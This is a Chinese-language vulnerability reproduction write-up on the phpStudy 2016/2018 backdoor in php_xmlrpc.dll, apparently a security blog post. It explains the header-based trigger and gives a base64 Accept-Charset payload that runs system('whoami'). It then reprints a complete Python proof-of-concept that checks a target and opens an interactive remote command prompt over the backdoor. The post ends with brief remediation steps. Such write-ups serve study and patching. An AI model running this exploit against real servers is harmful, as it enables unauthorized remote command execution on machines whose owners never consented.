#  phpstudy_2016-2018_rce 漏洞复现   
Sword  网络安全学习爱好者   2024-11-16 10:41  
  
# 漏洞描述  
  
攻击者可以利用该漏洞执行PHP 命令，也可以称作 phpStudy 后门 。RCE(Remote Command|Code Execute)  
  
Phpstudy软件是国内的一款免费的PHP调试环境的程序集成包，通过集成Apache、PHP、MySQL、phpMyAdmin等多款软件一次性安装，无需配置即可直接安装使用，一键搭建。  
**其中2016、2018版本的phpstudy存在被黑客恶意篡改后形成的RCE漏洞**  
。该漏洞可以直接远程执行系统命令。  
# 影响版本  
  
 phpStudy 2016和2018两个版本  
  
后门代码存在于\ext\php_xmlrpc.dll模块中  
- phpStudy2016 查看  
  
- \phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll  
  
- \phpStudy\php\php-5.4.45\ext\php_xmlrpc.dll  
  
- phpStudy2018查看  
  
- \phpStudy\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll  
  
- \phpStudy\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll  
  
# 漏洞分析  
  
**网上某位大佬的**  
  
通过 IDA分析xmlrpc.dll发现，被植入危险函数eval()。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWbJ9urmgmhONqp2M8MJicLAmSGuiaarggseoSWur0IkR5fgLQ4xh4pb1Q/640?wx_fmt=png&from=appmsg "")  
  
xmlrpc.dll中的初始化函数request_startup_func被篡改:当发起HTTP请求的数据包中包含“Accept-Encoding”字段时，就会进入黑客自定义的攻击流程。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsW6oVH5C2Bg2DncDXTI69eNwuUsUNgeygWxiax9ibncX6wPD1UAKrQfRyg/640?wx_fmt=png&from=appmsg "")  
  
当Accept-Encoding字段的信息为“compress,gzip”时，触发系统收集功能。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWL7JNEI6bnJheRcPdJ8pt8bBpSxTXN3QibZDYCOibgS9tDWIM7ehlc12w/640?wx_fmt=png&from=appmsg "")  
  
当Accept-Encoding字段的信息为“gzip,deflate”时，再进一步判断Accept-Charset字段，只有当Accept-Charset字段为一些特定字符时才会触发漏洞。  
# 漏洞复现  
## 环境搭建  
  
安装phpstudy2016或者phpstudy2018，  
**需要把PHP版本换成5.2.17或5.4.45版本**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsW0icoBCfSpErFqnPibBiaZNDcSLGPWg7cb9fZL9qcn99Lqribew0rpNI5fQ/640?wx_fmt=png&from=appmsg "")  
### 查看是否漏洞验证  
- phpStudy2016查看  
  
- \phpStudy\php\php-5.2.17\ext\php_xmlrpc.dll  
  
- \phpStudy\php\php-5.4.45\ext\php_xmlrpc.dll  
  
- phpStudy2018查看  
  
- \phpStudy\PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll  
  
- \phpStudy\PHPTutorial\PHP\PHP-5.2.17\ext\php_xmlrpc.dll  
  
打开你phpstudy对应的文件查找@eval，文件存在@eval(%s(‘%s’))证明漏洞存在  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWdPAXxCicvcQLlrc5K8yScGwVoJNTUazexfwZ7WT24pZVAQIKGVbq3Zg/640?wx_fmt=png&from=appmsg "")  
## 漏洞利用  
### code1：手工利用  
  
使用burp抓包  
  
添加请求头  
Accept-Charset  
值是想要执行的php代码  
system('whoami');  
代码需要进行base64编码  
```
Accept-Charset: c3lzdGVtKCd3aG9hbWknKTs=
```  
  
需要将  
Accept-Encoding: gzip, deflate  
修改为  
Accept-Encoding: gzip,deflate  
就是把中间的空格删掉  
**（具体原因可以看上面大佬的漏洞分析）**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWrmX4X5xlTSWc5OXia0pXPuKA8cBZxZFayT1q4QXdKGDvgVChKrQGYnw/640?wx_fmt=png&from=appmsg "")  
  
重放请求包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWGcrpibMTz1C2UxDoqib20CoicshibJlicBeVwx5eLfxSCDR3h0cntnK9Vrw/640?wx_fmt=png&from=appmsg "")  
### code2：POC脚本  
  
**来源于GitHub**  
```
# phpStudy_2016-2018_RCE_POC.py
import requests
import base64
import string
import random
from time import sleep
#向目标提交请求，漏洞触发。
def rce(url,cmd):
    cmd = base64.b64encode("system('{}');".format(cmd).encode()).decode()
    headers = {
            'Accept-Charset': cmd,#请求头中提交参数，触发漏洞。
            'Accept-Encoding':'gzip,deflate',#请求头中提交参数，触发漏洞。
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284'
    } #浏览器指纹
    res = requests.get(url = url ,headers=headers)
    print(res.status_code)
    if res.status_code == 200:        #判断是否能与目标正常通信
        bof = 0
        eof = res.content.index(b"<!DOCTYPE html")  #将回复内容转化为二进制字符
        k = (res.content[bof:eof].decode("gbk"))
        return k
    else:
        exit("error url!")
# 生成随机数与目标返回的字符对比，判断目标是否在线。
def judge():
    j = ''
    for i in range(18):
        j +=random.choice(string.digits + string.ascii_letters)
    return j
#初始化
def main(url):
    flag1 = judge()
    cmd = "echo " + flag1
    flag2 = rce(url, cmd)
    if  flag1 in flag2 :
       print("[+] Target is enable!")
       while True:
            cmd = input("[*] cmd >")
            if cmd == "q" or cmd == "":
                break
            print(rce(url, cmd))
    else:
        print("[+] Target is not  enable! exit 3s later")
        sleep(3)
        exit()

if __name__ == "__main__":
    url = input("Enter an url ：")
    print("[+] Testing url:{}".format(url))
    print('-----------------')
    main(url)
```  
  
****```
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZAPxzic90CGBb636ckQ1MC08nniczShXsWhwzrKCAibPA8vsjBaPOe9Sm1Nu6Af9fl4KR0DkP1qmVibaBdleQGUIWw/640?wx_fmt=png&from=appmsg "")  
# 修复建议  
  
下载：phpxmlrpc.rar 解压 复制文件  
- php\php-5.2.17\ext\php_xmlrpc.dll  
  
- php\php-5.4.45\ext\php_xmlrpc.dll  
  
覆盖原路径文件即可。  
## 复现环境所需安装包以及工具公众回复phpstudy16+18获取  
  
